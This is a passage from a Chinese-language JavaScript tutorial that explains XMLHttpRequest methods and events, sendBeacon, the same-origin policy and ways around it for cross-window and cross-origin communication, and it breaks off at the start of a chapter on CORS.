    > <progress min="0" max="100" value="0">0% complete</progress>
    > ```
    >
    > 文件上传时，对`upload`属性指定`progress`事件的监听函数，即可获得上传的进度。
    >
    > ```
    > function upload(blobOrFile) {
    >   var xhr = new XMLHttpRequest();
    >   xhr.open('POST', '/server', true);
    >   xhr.onload = function (e) {};
    > 
    >   var progressBar = document.querySelector('progress');
    >   xhr.upload.onprogress = function (e) {
    >     if (e.lengthComputable) {
    >       progressBar.value = (e.loaded / e.total) * 100;
    >       // 兼容不支持 <progress> 元素的老式浏览器
    >       progressBar.textContent = progressBar.value;
    >     }
    >   };
    > 
    >   xhr.send(blobOrFile);
    > }
    > 
    > upload(new Blob(['hello world'], {type: 'text/plain'}));
    > ```
    >
    > ## XMLHttpRequest 的实例方法
    >
    > ### XMLHttpRequest.open()
    >
    > `XMLHttpRequest.open()`方法用于指定 HTTP 请求的参数，或者说初始化 XMLHttpRequest 实例对象。它一共可以接受五个参数。
    >
    > ```
    > void open(
    >    string method,
    >    string url,
    >    optional boolean async,
    >    optional string user,
    >    optional string password
    > );
    > ```
    >
    > - `method`：表示 HTTP 动词方法，比如`GET`、`POST`、`PUT`、`DELETE`、`HEAD`等。
    > - `url`: 表示请求发送目标 URL。
    > - `async`: 布尔值，表示请求是否为异步，默认为`true`。如果设为`false`，则`send()`方法只有等到收到服务器返回了结果，才会进行下一步操作。该参数可选。由于同步 AJAX 请求会造成浏览器失去响应，许多浏览器已经禁止在主线程使用，只允许 Worker 里面使用。所以，这个参数轻易不应该设为`false`。
    > - `user`：表示用于认证的用户名，默认为空字符串。该参数可选。
    > - `password`：表示用于认证的密码，默认为空字符串。该参数可选。
    >
    > 注意，如果对使用过`open()`方法的 AJAX 请求，再次使用这个方法，等同于调用`abort()`，即终止请求。
    >
    > 下面发送 POST 请求的例子。
    >
    > ```
    > var xhr = new XMLHttpRequest();
    > xhr.open('POST', encodeURI('someURL'));
    > ```
    >
    > ### XMLHttpRequest.send()
    >
    > `XMLHttpRequest.send()`方法用于实际发出 HTTP 请求。它的参数是可选的，如果不带参数，就表示 HTTP 请求只有一个 URL，没有数据体，典型例子就是 GET 请求；如果带有参数，就表示除了头信息，还带有包含具体数据的信息体，典型例子就是 POST 请求。
    >
    > 下面是 GET 请求的例子。
    >
    > ```
    > var xhr = new XMLHttpRequest();
    > xhr.open('GET',
    >   'http://www.example.com/?id=' + encodeURIComponent(id),
    >   true
    > );
    > xhr.send(null);
    > ```
    >
    > 上面代码中，`GET`请求的参数，作为查询字符串附加在 URL 后面。
    >
    > 下面是发送 POST 请求的例子。
    >
    > ```
    > var xhr = new XMLHttpRequest();
    > var data = 'email='
    >   + encodeURIComponent(email)
    >   + '&password='
    >   + encodeURIComponent(password);
    > 
    > xhr.open('POST', 'http://www.example.com', true);
    > xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    > xhr.send(data);
    > ```
    >
    > 注意，所有 XMLHttpRequest 的监听事件，都必须在`send()`方法调用之前设定。
    >
    > `send`方法的参数就是发送的数据。多种格式的数据，都可以作为它的参数。
    >
    > ```
    > void send();
    > void send(ArrayBufferView data);
    > void send(Blob data);
    > void send(Document data);
    > void send(String data);
    > void send(FormData data);
    > ```
    >
    > 如果`send()`发送 DOM 对象，在发送之前，数据会先被串行化。如果发送二进制数据，最好是发送`ArrayBufferView`或`Blob`对象，这使得通过 Ajax 上传文件成为可能。
    >
    > 下面是发送表单数据的例子。`FormData`对象可以用于构造表单数据。
    >
    > ```
    > var formData = new FormData();
    > 
    > formData.append('username', '张三');
    > formData.append('email', 'zhangsan@example.com');
    > formData.append('birthDate', 1940);
    > 
    > var xhr = new XMLHttpRequest();
    > xhr.open('POST', '/register');
    > xhr.send(formData);
    > ```
    >
    > 上面代码中，`FormData`对象构造了表单数据，然后使用`send()`方法发送。它的效果与发送下面的表单数据是一样的。
    >
    > ```
    > <form id='registration' name='registration' action='/register'>
    >   <input type='text' name='username' value='张三'>
    >   <input type='email' name='email' value='zhangsan@example.com'>
    >   <input type='number' name='birthDate' value='1940'>
    >   <input type='submit' onclick='return sendForm(this.form);'>
    > </form>
    > ```
    >
    > 下面的例子是使用`FormData`对象加工表单数据，然后再发送。
    >
    > ```
    > function sendForm(form) {
    >   var formData = new FormData(form);
    >   formData.append('csrf', 'e69a18d7db1286040586e6da1950128c');
    > 
    >   var xhr = new XMLHttpRequest();
    >   xhr.open('POST', form.action, true);
    >   xhr.onload = function() {
    >     // ...
    >   };
    >   xhr.send(formData);
    > 
    >   return false;
    > }
    > 
    > var form = document.querySelector('#registration');
    > sendForm(form);
    > ```
    >
    > ### XMLHttpRequest.setRequestHeader()
    >
    > `XMLHttpRequest.setRequestHeader()`方法用于设置浏览器发送的 HTTP 请求的头信息。该方法必须在`open()`之后、`send()`之前调用。如果该方法多次调用，设定同一个字段，则每一次调用的值会被合并成一个单一的值发送。
    >
    > 该方法接受两个参数。第一个参数是字符串，表示头信息的字段名，第二个参数是字段值。
    >
    > ```
    > xhr.setRequestHeader('Content-Type', 'application/json');
    > xhr.setRequestHeader('Content-Length', JSON.stringify(data).length);
    > xhr.send(JSON.stringify(data));
    > ```
    >
    > 上面代码首先设置头信息`Content-Type`，表示发送 JSON 格式的数据；然后设置`Content-Length`，表示数据长度；最后发送 JSON 数据。
    >
    > ### XMLHttpRequest.overrideMimeType()
    >
    > `XMLHttpRequest.overrideMimeType()`方法用来指定 MIME 类型，覆盖服务器返回的真正的 MIME 类型，从而让浏览器进行不一样的处理。举例来说，服务器返回的数据类型是`text/xml`，由于种种原因浏览器解析不成功报错，这时就拿不到数据了。为了拿到原始数据，我们可以把 MIME 类型改成`text/plain`，这样浏览器就不会去自动解析，从而我们就可以拿到原始文本了。
    >
    > ```
    > xhr.overrideMimeType('text/plain')
    > ```
    >
    > 注意，该方法必须在`send()`方法之前调用。
    >
    > 修改服务器返回的数据类型，不是正常情况下应该采取的方法。如果希望服务器返回指定的数据类型，可以用`responseType`属性告诉服务器，就像下面的例子。只有在服务器无法返回某种数据类型时，才使用`overrideMimeType()`方法。
    >
    > ```
    > var xhr = new XMLHttpRequest();
    > xhr.onload = function(e) {
    >   var arraybuffer = xhr.response;
    >   // ...
    > }
    > xhr.open('GET', url);
    > xhr.responseType = 'arraybuffer';
    > xhr.send();
    > ```
    >
    > ### XMLHttpRequest.getResponseHeader()
    >
    > `XMLHttpRequest.getResponseHeader()`方法返回 HTTP 头信息指定字段的值，如果还没有收到服务器回应或者指定字段不存在，返回`null`。该方法的参数不区分大小写。
    >
    > ```
    > function getHeaderTime() {
    >   console.log(this.getResponseHeader("Last-Modified"));
    > }
    > 
    > var xhr = new XMLHttpRequest();
    > xhr.open('HEAD', 'yourpage.html');
    > xhr.onload = getHeaderTime;
    > xhr.send();
    > ```
    >
    > 如果有多个字段同名，它们的值会被连接为一个字符串，每个字段之间使用“逗号+空格”分隔。
    >
    > ### XMLHttpRequest.getAllResponseHeaders()
    >
    > `XMLHttpRequest.getAllResponseHeaders()`方法返回一个字符串，表示服务器发来的所有 HTTP 头信息。格式为字符串，每个头信息之间使用`CRLF`分隔（回车+换行），如果没有收到服务器回应，该属性为`null`。如果发生网络错误，该属性为空字符串。
    >
    > ```
    > var xhr = new XMLHttpRequest();
    > xhr.open('GET', 'foo.txt', true);
    > xhr.send();
    > 
    > xhr.onreadystatechange = function () {
    >   if (this.readyState === 4) {
    >     var headers = xhr.getAllResponseHeaders();
    >   }
    > }
    > ```
    >
    > 上面代码用于获取服务器返回的所有头信息。它可能是下面这样的字符串。
    >
    > ```
    > date: Fri, 08 Dec 2017 21:04:30 GMT\r\n
    > content-encoding: gzip\r\n
    > x-content-type-options: nosniff\r\n
    > server: meinheld/0.6.1\r\n
    > x-frame-options: DENY\r\n
    > content-type: text/html; charset=utf-8\r\n
    > connection: keep-alive\r\n
    > strict-transport-security: max-age=63072000\r\n
    > vary: Cookie, Accept-Encoding\r\n
    > content-length: 6502\r\n
    > x-xss-protection: 1; mode=block\r\n
    > ```
    >
    > 然后，对这个字符串进行处理。
    >
    > ```
    > var arr = headers.trim().split(/[\r\n]+/);
    > var headerMap = {};
    > 
    > arr.forEach(function (line) {
    >   var parts = line.split(': ');
    >   var header = parts.shift();
    >   var value = parts.join(': ');
    >   headerMap[header] = value;
    > });
    > 
    > headerMap['content-length'] // "6502"
    > ```
    >
    > ### XMLHttpRequest.abort()
    >
    > `XMLHttpRequest.abort()`方法用来终止已经发出的 HTTP 请求。调用这个方法以后，`readyState`属性变为`4`，`status`属性变为`0`。
    >
    > ```
    > var xhr = new XMLHttpRequest();
    > xhr.open('GET', 'http://www.example.com/page.php', true);
    > setTimeout(function () {
    >   if (xhr) {
    >     xhr.abort();
    >     xhr = null;
    >   }
    > }, 5000);
    > ```
    >
    > 上面代码在发出5秒之后，终止一个 AJAX 请求。
    >
    > ## XMLHttpRequest 实例的事件
    >
    > ### readyStateChange 事件
    >
    > `readyState`属性的值发生改变，就会触发 readyStateChange 事件。
    >
    > 我们可以通过`onReadyStateChange`属性，指定这个事件的监听函数，对不同状态进行不同处理。尤其是当状态变为`4`的时候，表示通信成功，这时回调函数就可以处理服务器传送回来的数据。
    >
    > ### progress 事件
    >
    > 上传文件时，XMLHttpRequest 实例对象本身和实例的`upload`属性，都有一个`progress`事件，会不断返回上传的进度。
    >
    > ```
    > var xhr = new XMLHttpRequest();
    > 
    > function updateProgress (oEvent) {
    >   if (oEvent.lengthComputable) {
    >     var percentComplete = oEvent.loaded / oEvent.total;
    >   } else {
    >     console.log('无法计算进展');
    >   }
    > }
    > 
    > xhr.addEventListener('progress', updateProgress);
    > 
    > xhr.open();
    > ```
    >
    > ### load 事件、error 事件、abort 事件
    >
    > load 事件表示服务器传来的数据接收完毕，error 事件表示请求出错，abort 事件表示请求被中断（比如用户取消请求）。
    >
    > ```
    > var xhr = new XMLHttpRequest();
    > 
    > xhr.addEventListener('load', transferComplete);
    > xhr.addEventListener('error', transferFailed);
    > xhr.addEventListener('abort', transferCanceled);
    > 
    > xhr.open();
    > 
    > function transferComplete() {
    >   console.log('数据接收完毕');
    > }
    > 
    > function transferFailed() {
    >   console.log('数据接收出错');
    > }
    > 
    > function transferCanceled() {
    >   console.log('用户取消接收');
    > }
    > ```
    >
    > ### loadend 事件
    >
    > `abort`、`load`和`error`这三个事件，会伴随一个`loadend`事件，表示请求结束，但不知道其是否成功。
    >
    > ```
    > xhr.addEventListener('loadend', loadEnd);
    > 
    > function loadEnd(e) {
    >   console.log('请求结束，状态未知');
    > }
    > ```
    >
    > ### timeout 事件
    >
    > 服务器超过指定时间还没有返回结果，就会触发 timeout 事件，具体的例子参见`timeout`属性一节。
    >
    > ## Navigator.sendBeacon()
    >
    > 用户卸载网页的时候，有时需要向服务器发一些数据。很自然的做法是在`unload`事件或`beforeunload`事件的监听函数里面，使用`XMLHttpRequest`对象发送数据。但是，这样做不是很可靠，因为`XMLHttpRequest`对象是异步发送，很可能在它即将发送的时候，页面已经卸载了，从而导致发送取消或者发送失败。
    >
    > 解决方法就是`unload`事件里面，加一些很耗时的同步操作。这样就能留出足够的时间，保证异步 AJAX 能够发送成功。
    >
    > ```
    > function log() {
    >   let xhr = new XMLHttpRequest();
    >   xhr.open('post', '/log', true);
    >   xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    >   xhr.send('foo=bar');
    > }
    > 
    > window.addEventListener('unload', function(event) {
    >   log();
    > 
    >   // a time-consuming operation
    >   for (let i = 1; i < 10000; i++) {
    >     for (let m = 1; m < 10000; m++) { continue; }
    >   }
    > });
    > ```
    >
    > 上面代码中，强制执行了一次双重循环，拖长了`unload`事件的执行时间，导致异步 AJAX 能够发送成功。
    >
    > 类似的还可以使用`setTimeout()`。下面是追踪用户点击的例子。
    >
    > ```
    > // HTML 代码如下
    > // <a id="target" href="https://baidu.com">click</a>
    > const clickTime = 350;
    > const theLink = document.getElementById('target');
    > 
    > function log() {
    >   let xhr = new XMLHttpRequest();
    >   xhr.open('post', '/log', true);
    >   xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    >   xhr.send('foo=bar');
    > }
    > 
    > theLink.addEventListener('click', function (event) {
    >   event.preventDefault();
    >   log();
    > 
    >   setTimeout(function () {
    >     window.location.href = theLink.getAttribute('href');
    >   }, clickTime);
    > });
    > ```
    >
    > 上面代码使用`setTimeout()`，拖延了350毫秒，才让页面跳转，因此使得异步 AJAX 有时间发出。
    >
    > 这些做法的共同问题是，卸载的时间被硬生生拖长了，后面页面的加载被推迟了，用户体验不好。
    >
    > 为了解决这个问题，浏览器引入了`Navigator.sendBeacon()`方法。这个方法还是异步发出请求，但是请求与当前页面线程脱钩，作为浏览器进程的任务，因此可以保证会把数据发出去，不拖延卸载流程。
    >
    > ```
    > window.addEventListener('unload', logData, false);
    > 
    > function logData() {
    >   navigator.sendBeacon('/log', JSON.stringify({
    >     some: "data"
    >   }));
    > }
    > ```
    >
    > `Navigator.sendBeacon()`方法接受两个参数，第一个参数是目标服务器的 URL，第二个参数是所要发送的数据（可选），可以是任意类型（字符串、表单对象、二进制对象等等）。
    >
    > ```
    > navigator.sendBeacon(url, data)
    > ```
    >
    > 这个方法的返回值是一个布尔值，成功发送数据为`true`，否则为`false`。
    >
    > 该方法发送数据的 HTTP 方法是 POST，可以跨域，类似于表单提交数据。它不能指定回调函数。
    >
    > 下面是一个例子。
    >
    > ```
    > // HTML 代码如下
    > // <body onload="analytics('start')" onunload="analytics('end')">
    > 
    > function analytics(state) {
    >   if (!navigator.sendBeacon) return;
    > 
    >   var URL = 'http://example.com/analytics';
    >   var data = 'state=' + state + '&location=' + window.location;
    >   navigator.sendBeacon(URL, data);
    > }
    > ```
    >
    > 该方法不允许自定义 HTTP 标头，为了以“application/json”的形式发送数据，可以使用 Blob 对象。
    >
    > ```
    > const blob = new Blob(
    >   [ JSON.stringify({ some: "data" }) ],
    >   { type: 'application/json; charset=UTF-8' }
    > );
    > navigator.sendBeacon('/log', blob));
    > ```
    >
    > 这个方法的优先级较低，不会占用页面资源。一般是在浏览器空闲的时候，才会发送。

  - 同源策略

    > 浏览器安全的基石是“同源策略”（same-origin policy）。很多开发者都知道这一点，但了解得不全面。
    >
    > ## 概述
    >
    > ### 含义
    >
    > 1995年，同源政策由 Netscape 公司引入浏览器。目前，所有浏览器都实行这个政策。
    >
    > 最初，它的含义是指，A 网页设置的 Cookie，B 网页不能打开，除非这两个网页“同源”。所谓“同源”指的是“三个相同”。
    >
    > > - 协议相同
    > > - 域名相同
    > > - 端口相同（这点可以忽略，详见下文）
    >
    > 举例来说，`http://www.example.com/dir/page.html`这个网址，协议是`http://`，域名是`www.example.com`，端口是`80`（默认端口可以省略），它的同源情况如下。
    >
    > - `http://www.example.com/dir2/other.html`：同源
    > - `http://example.com/dir/other.html`：不同源（域名不同）
    > - `http://v2.www.example.com/dir/other.html`：不同源（域名不同）
    > - `http://www.example.com:81/dir/other.html`：不同源（端口不同）
    > - `https://www.example.com/dir/page.html`：不同源（协议不同）
    >
    > 注意，标准规定端口不同的网址不是同源（比如8000端口和8001端口不是同源），但是浏览器没有遵守这条规定。实际上，同一个网域的不同端口，是可以互相读取 Cookie 的。
    >
    > ### 目的
    >
    > 同源政策的目的，是为了保证用户信息的安全，防止恶意的网站窃取数据。
    >
    > 设想这样一种情况：A 网站是一家银行，用户登录以后，A 网站在用户的机器上设置了一个 Cookie，包含了一些隐私信息。用户离开 A 网站以后，又去访问 B 网站，如果没有同源限制，B 网站可以读取 A 网站的 Cookie，那么隐私就泄漏了。更可怕的是，Cookie 往往用来保存用户的登录状态，如果用户没有退出登录，其他网站就可以冒充用户，为所欲为。因为浏览器同时还规定，提交表单不受同源政策的限制。
    >
    > 由此可见，同源政策是必需的，否则 Cookie 可以共享，互联网就毫无安全可言了。
    >
    > ### 限制范围
    >
    > 随着互联网的发展，同源政策越来越严格。目前，如果非同源，共有三种行为受到限制。
    >
    > > （1） 无法读取非同源网页的 Cookie、LocalStorage 和 IndexedDB。
    > >
    > > （2） 无法接触非同源网页的 DOM。
    > >
    > > （3） 无法向非同源地址发送 AJAX 请求（可以发送，但浏览器会拒绝接受响应）。
    >
    > 另外，通过 JS 脚本可以拿到其他窗口的`window`对象。如果是非同源的网页，目前允许一个窗口可以接触其他网页的`window`对象的九个属性和四个方法。
    >
    > - window.closed
    > - window.frames
    > - window.length
    > - window.location
    > - window.opener
    > - window.parent
    > - window.self
    > - window.top
    > - window.window
    > - window.blur()
    > - window.close()
    > - window.focus()
    > - window.postMessage()
    >
    > 上面的九个属性之中，只有`window.location`是可读写的，其他八个全部都是只读。而且，即使是`location`对象，非同源的情况下，也只允许调用`location.replace()`方法和写入`location.href`属性。
    >
    > 虽然这些限制是必要的，但是有时很不方便，合理的用途也受到影响。下面介绍如何规避上面的限制。
    >
    > ## Cookie
    >
    > Cookie 是服务器写入浏览器的一小段信息，只有同源的网页才能共享。如果两个网页一级域名相同，只是次级域名不同，浏览器允许通过设置`document.domain`共享 Cookie。
    >
    > 举例来说，A 网页的网址是`http://w1.example.com/a.html`，B 网页的网址是`http://w2.example.com/b.html`，那么只要设置相同的`document.domain`，两个网页就可以共享 Cookie。因为浏览器通过`document.domain`属性来检查是否同源。
    >
    > ```
    > // 两个网页都需要设置
    > document.domain = 'example.com';
    > ```
    >
    > 注意，A 和 B 两个网页都需要设置`document.domain`属性，才能达到同源的目的。因为设置`document.domain`的同时，会把端口重置为`null`，因此如果只设置一个网页的`document.domain`，会导致两个网址的端口不同，还是达不到同源的目的。
    >
    > 现在，A 网页通过脚本设置一个 Cookie。
    >
    > ```
    > document.cookie = "test1=hello";
    > ```
    >
    > B 网页就可以读到这个 Cookie。
    >
    > ```
    > var allCookie = document.cookie;
    > ```
    >
    > 注意，这种方法只适用于 Cookie 和 iframe 窗口，LocalStorage 和 IndexedDB 无法通过这种方法，规避同源政策，而要使用下文介绍 PostMessage API。
    >
    > 另外，服务器也可以在设置 Cookie 的时候，指定 Cookie 的所属域名为一级域名，比如`example.com`。
    >
    > ```
    > Set-Cookie: key=value; domain=example.com; path=/
    > ```
    >
    > 这样的话，二级域名和三级域名不用做任何设置，都可以读取这个 Cookie。
    >
    > ## iframe 和多窗口通信
    >
    > `iframe`元素可以在当前网页之中，嵌入其他网页。每个`iframe`元素形成自己的窗口，即有自己的`window`对象。`iframe`窗口之中的脚本，可以获得父窗口和子窗口。但是，只有在同源的情况下，父窗口和子窗口才能通信；如果跨域，就无法拿到对方的 DOM。
    >
    > 比如，父窗口运行下面的命令，如果`iframe`窗口不是同源，就会报错。
    >
    > ```
    > document
    > .getElementById("myIFrame")
    > .contentWindow
    > .document
    > // Uncaught DOMException: Blocked a frame from accessing a cross-origin frame.
    > ```
    >
    > 上面命令中，父窗口想获取子窗口的 DOM，因为跨域导致报错。
    >
    > 反之亦然，子窗口获取主窗口的 DOM 也会报错。
    >
    > ```
    > window.parent.document.body
    > // 报错
    > ```
    >
    > 这种情况不仅适用于`iframe`窗口，还适用于`window.open`方法打开的窗口，只要跨域，父窗口与子窗口之间就无法通信。
    >
    > 如果两个窗口一级域名相同，只是二级域名不同，那么设置上一节介绍的`document.domain`属性，就可以规避同源政策，拿到 DOM。
    >
    > 对于完全不同源的网站，目前有两种方法，可以解决跨域窗口的通信问题。
    >
    > > - 片段识别符（fragment identifier）
    > > - 跨文档通信API（Cross-document messaging）
    >
    > ### 片段识别符
    >
    > 片段标识符（fragment identifier）指的是，URL 的`#`号后面的部分，比如`http://example.com/x.html#fragment`的`#fragment`。如果只是改变片段标识符，页面不会重新刷新。
    >
    > 父窗口可以把信息，写入子窗口的片段标识符。
    >
    > ```
    > var src = originURL + '#' + data;
    > document.getElementById('myIFrame').src = src;
    > ```
    >
    > 上面代码中，父窗口把所要传递的信息，写入 iframe 窗口的片段标识符。
    >
    > 子窗口通过监听`hashchange`事件得到通知。
    >
    > ```
    > window.onhashchange = checkMessage;
    > 
    > function checkMessage() {
    >   var message = window.location.hash;
    >   // ...
    > }
    > ```
    >
    > 同样的，子窗口也可以改变父窗口的片段标识符。
    >
    > ```
    > parent.location.href = target + '#' + hash;
    > ```
    >
    > ### window.postMessage()
    >
    > 上面的这种方法属于破解，HTML5 为了解决这个问题，引入了一个全新的API：跨文档通信 API（Cross-document messaging）。
    >
    > 这个 API 为`window`对象新增了一个`window.postMessage`方法，允许跨窗口通信，不论这两个窗口是否同源。举例来说，父窗口`aaa.com`向子窗口`bbb.com`发消息，调用`postMessage`方法就可以了。
    >
    > ```
    > // 父窗口打开一个子窗口
    > var popup = window.open('http://bbb.com', 'title');
    > // 父窗口向子窗口发消息
    > popup.postMessage('Hello World!', 'http://bbb.com');
    > ```
    >
    > `postMessage`方法的第一个参数是具体的信息内容，第二个参数是接收消息的窗口的源（origin），即“协议 + 域名 + 端口”。也可以设为`*`，表示不限制域名，向所有窗口发送。
    >
    > 子窗口向父窗口发送消息的写法类似。
    >
    > ```
    > // 子窗口向父窗口发消息
    > window.opener.postMessage('Nice to see you', 'http://aaa.com');
    > ```
    >
    > 父窗口和子窗口都可以通过`message`事件，监听对方的消息。
    >
    > ```
    > // 父窗口和子窗口都可以用下面的代码，
    > // 监听 message 消息
    > window.addEventListener('message', function (e) {
    >   console.log(e.data);
    > },false);
    > ```
    >
    > `message`事件的参数是事件对象`event`，提供以下三个属性。
    >
    > > - `event.source`：发送消息的窗口
    > > - `event.origin`: 消息发送者的源（origin），即协议、域名、端口。
    > > - `event.data`: 消息内容
    >
    > 下面的例子是，子窗口通过`event.source`属性引用父窗口，然后发送消息。
    >
    > ```
    > window.addEventListener('message', receiveMessage);
    > function receiveMessage(event) {
    >   event.source.postMessage('Nice to see you!', '*');
    > }
    > ```
    >
    > 上面代码有几个地方需要注意。首先，`receiveMessage`函数里面没有过滤信息的来源，任意网址发来的信息都会被处理。其次，`postMessage`方法中指定的目标窗口的网址是一个星号，表示该信息可以向任意网址发送。通常来说，这两种做法是不推荐的，因为不够安全，可能会被恶意利用。
    >
    > `event.origin`属性可以过滤非许可地址发来的消息。
    >
    > ```
    > window.addEventListener('message', receiveMessage);
    > function receiveMessage(event) {
    >   if (event.origin !== 'http://aaa.com') return;
    >   if (event.data === 'Hello World') {
    >     event.source.postMessage('Hello', event.origin);
    >   } else {
    >     console.log(event.data);
    >   }
    > }
    > ```
    >
    > ### LocalStorage
    >
    > 通过`window.postMessage`，读写其他窗口的 LocalStorage 也成为了可能。
    >
    > 下面是一个例子，主窗口写入 iframe 子窗口的`localStorage`。
    >
    > ```
    > window.onmessage = function(e) {
    >   if (e.origin !== 'http://bbb.com') {
    >     return;
    >   }
    >   var payload = JSON.parse(e.data);
    >   localStorage.setItem(payload.key, JSON.stringify(payload.data));
    > };
    > ```
    >
    > 上面代码中，子窗口将父窗口发来的消息，写入自己的 LocalStorage。
    >
    > 父窗口发送消息的代码如下。
    >
    > ```
    > var win = document.getElementsByTagName('iframe')[0].contentWindow;
    > var obj = { name: 'Jack' };
    > win.postMessage(
    >   JSON.stringify({key: 'storage', data: obj}),
    >   'http://bbb.com'
    > );
    > ```
    >
    > 加强版的子窗口接收消息的代码如下。
    >
    > ```
    > window.onmessage = function(e) {
    >   if (e.origin !== 'http://bbb.com') return;
    >   var payload = JSON.parse(e.data);
    >   switch (payload.method) {
    >     case 'set':
    >       localStorage.setItem(payload.key, JSON.stringify(payload.data));
    >       break;
    >     case 'get':
    >       var parent = window.parent;
    >       var data = localStorage.getItem(payload.key);
    >       parent.postMessage(data, 'http://aaa.com');
    >       break;
    >     case 'remove':
    >       localStorage.removeItem(payload.key);
    >       break;
    >   }
    > };
    > ```
    >
    > 加强版的父窗口发送消息代码如下。
    >
    > ```
    > var win = document.getElementsByTagName('iframe')[0].contentWindow;
    > var obj = { name: 'Jack' };
    > // 存入对象
    > win.postMessage(
    >   JSON.stringify({key: 'storage', method: 'set', data: obj}),
    >   'http://bbb.com'
    > );
    > // 读取对象
    > win.postMessage(
    >   JSON.stringify({key: 'storage', method: "get"}),
    >   "*"
    > );
    > window.onmessage = function(e) {
    >   if (e.origin != 'http://aaa.com') return;
    >   console.log(JSON.parse(e.data).name);
    > };
    > ```
    >
    > ## AJAX
    >
    > 同源政策规定，AJAX 请求只能发给同源的网址，否则就报错。
    >
    > 除了架设服务器代理（浏览器请求同源服务器，再由后者请求外部服务），有三种方法规避这个限制。
    >
    > > - JSONP
    > > - WebSocket
    > > - CORS
    >
    > ### JSONP
    >
    > JSONP 是服务器与客户端跨源通信的常用方法。最大特点就是简单易用，没有兼容性问题，老式浏览器全部支持，服务端改造非常小。
    >
    > 它的做法如下。
    >
    > 第一步，网页添加一个`<script>`元素，向服务器请求一个脚本，这不受同源政策限制，可以跨域请求。
    >
    > ```
    > <script src="http://api.foo.com?callback=bar"></script>
    > ```
    >
    > 注意，请求的脚本网址有一个`callback`参数（`?callback=bar`），用来告诉服务器，客户端的回调函数名称（`bar`）。
    >
    > 第二步，服务器收到请求后，拼接一个字符串，将 JSON 数据放在函数名里面，作为字符串返回（`bar({...})`）。
    >
    > 第三步，客户端会将服务器返回的字符串，作为代码解析，因为浏览器认为，这是`<script>`标签请求的脚本内容。这时，客户端只要定义了`bar()`函数，就能在该函数体内，拿到服务器返回的 JSON 数据。
    >
    > 下面看一个实例。首先，网页动态插入`<script>`元素，由它向跨域网址发出请求。
    >
    > ```
    > function addScriptTag(src) {
    >   var script = document.createElement('script');
    >   script.setAttribute('type', 'text/javascript');
    >   script.src = src;
    >   document.body.appendChild(script);
    > }
    > 
    > window.onload = function () {
    >   addScriptTag('http://example.com/ip?callback=foo');
    > }
    > 
    > function foo(data) {
    >   console.log('Your public IP address is: ' + data.ip);
    > };
    > ```
    >
    > 上面代码通过动态添加`<script>`元素，向服务器`example.com`发出请求。注意，该请求的查询字符串有一个`callback`参数，用来指定回调函数的名字，这对于 JSONP 是必需的。
    >
    > 服务器收到这个请求以后，会将数据放在回调函数的参数位置返回。
    >
    > ```
    > foo({
    >   'ip': '8.8.8.8'
    > });
    > ```
    >
    > 由于`<script>`元素请求的脚本，直接作为代码运行。这时，只要浏览器定义了`foo`函数，该函数就会立即调用。作为参数的 JSON 数据被视为 JS 对象，而不是字符串，因此避免了使用`JSON.parse`的步骤。
    >
    > ### WebSocket
    >
    > WebSocket 是一种通信协议，使用`ws://`（非加密）和`wss://`（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。
    >
    > 下面是一个例子，浏览器发出的 WebSocket 请求的头信息（摘自[维基百科](https://en.wikipedia.org/wiki/WebSocket)）。
    >
    > ```
    > GET /chat HTTP/1.1
    > Host: server.example.com
    > Upgrade: websocket
    > Connection: Upgrade
    > Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==
    > Sec-WebSocket-Protocol: chat, superchat
    > Sec-WebSocket-Version: 13
    > Origin: http://example.com
    > ```
    >
    > 上面代码中，有一个字段是`Origin`，表示该请求的请求源（origin），即发自哪个域名。
    >
    > 正是因为有了`Origin`这个字段，所以 WebSocket 才没有实行同源政策。因为服务器可以根据这个字段，判断是否许可本次通信。如果该域名在白名单内，服务器就会做出如下回应。
    >
    > ```
    > HTTP/1.1 101 Switching Protocols
    > Upgrade: websocket
    > Connection: Upgrade
    > Sec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=
    > Sec-WebSocket-Protocol: chat
    > ```
    >
    > ### CORS
    >
    > CORS 是跨源资源分享（Cross-Origin Resource Sharing）的缩写。它是 W3C 标准，属于跨源 AJAX 请求的根本解决方法。相比 JSONP 只能发`GET`请求，CORS 允许任何类型的请求。
    >
    > 下一章将详细介绍，如何通过 CORS 完成跨源 AJAX 请求。

  - CORS 通信

    > CORS 是一个 W3C 标准，全称是“跨源资源共享”（Cross-origin resource sharing），或者通俗地称为“跨域资源共享”。它允许浏览器向跨源的服务器，发出`XMLHttpRequest`请求，从而克服了 AJAX 只能同源使用的限制。
    >
    > ## 简介
    >
    > CORS 需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能。
    >
    > 整个 CORS 通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS 通信与普通的 AJAX 通信没有差别，代码完全一样。浏览器一旦发现 AJAX 请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感知。因此，实现 CORS 通信的关键是服务器。只要服务器实现了 CORS 接口，就可以跨源通信。
    >
    > ## 两种请求
    >
    > CORS 请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。
    >
    > 只要同时满足以下两大条件，就属于简单请求。
    >
    > （1）请求方法是以下三种方法之一。
    >
    > > - HEAD
    > > - GET
    > > - POST
    >
    > （2）HTTP 的头信息不超出以下几种字段。
    >
    > > - Accept
    > > - Accept-Language
    > > - Content-Language
    > > - Last-Event-ID
    > > - Content-Type：只限于三个值`application/x-www-form-urlencoded`、`multipart/form-data`、`text/plain`
    >
    > 凡是不同时满足上面两个条件，就属于非简单请求。一句话，简单请求就是简单的 HTTP 方法与简单的 HTTP 头信息的结合。
    >
    > 这样划分的原因是，表单在历史上一直可以跨源发出请求。简单请求就是表单请求，浏览器沿袭了传统的处理方式，不把行为复杂化，否则开发者可能转而使用表单，规避 CORS 的限制。对于非简单请求，浏览器会采用新的处理方式。
    >
    > ## 简单请求
    >
    > ### 基本流程
    >
    > 对于简单请求，浏览器直接发出 CORS 请求。具体来说，就是在头信息之中，增加一个`Origin`字段。
    >
    > 下面是一个例子，浏览器发现这次跨源 AJAX 请求是简单请求，就自动在头信息之中，添加一个`Origin`字段。
    >
    > ```
    > GET /cors HTTP/1.1
    > Origin: http://api.bob.com
    > Host: api.alice.com
    > Accept-Language: en-US
    > Connection: keep-alive
